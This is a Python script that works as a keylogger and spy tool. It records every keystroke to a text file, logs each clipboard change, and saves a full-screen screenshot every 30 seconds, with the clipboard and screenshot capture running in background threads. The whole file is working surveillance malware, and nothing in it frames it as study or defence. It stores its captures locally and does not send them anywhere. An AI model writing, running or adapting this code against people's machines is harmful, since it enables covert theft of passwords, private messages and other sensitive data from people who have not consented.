import pynput
from pynput.keyboard import Key, Listener
import threading
import time
import os
from PIL import ImageGrab
import clipboard

# Log files
key_log_file = "key_log.txt"
clip_log_file = "clipboard_log.txt"
screenshot_folder = "screenshots"

# Create screenshots folder if not exist
if not os.path.exists(screenshot_folder):
    os.makedirs(screenshot_folder)

# Last clipboard content tracker
last_clipboard = None

def log_clipboard():
    global last_clipboard
    while True:
        try:
            current_clipboard = clipboard.paste()
            if current_clipboard != last_clipboard:
                last_clipboard = current_clipboard
                with open(clip_log_file, "a", encoding="utf-8") as f:
                    f.write(f"Clipboard changed:\n{current_clipboard}\n\n")
        except Exception as e:
            pass
        time.sleep(5)  # Check clipboard every 5 seconds

def take_screenshot():
    count = 0
    while True:
        try:
            img = ImageGrab.grab()
            filename = os.path.join(screenshot_folder, f"screenshot_{count}.png")
            img.save(filename)
            count += 1
        except Exception as e:
            pass
        time.sleep(30)  # Take screenshot every 30 seconds

def on_press(key):
    try:
        with open(key_log_file, "a", encoding="utf-8") as f:
            f.write(str(key.char))
    except AttributeError:
        with open(key_log_file, "a", encoding="utf-8") as f:
            if key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write('\n')
            else:
                f.write(f'[{key.name}]')

def on_release(key):
    # Stop listener on pressing ESC key (optional)
    if key == Key.esc:
        return False

if __name__ == "__main__":
    # Start clipboard logger thread
    clip_thread = threading.Thread(target=log_clipboard, daemon=True)
    clip_thread.start()

    # Start screenshot thread
    screenshot_thread = threading.Thread(target=take_screenshot, daemon=True)
    screenshot_thread.start()

    # Start keylogger listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
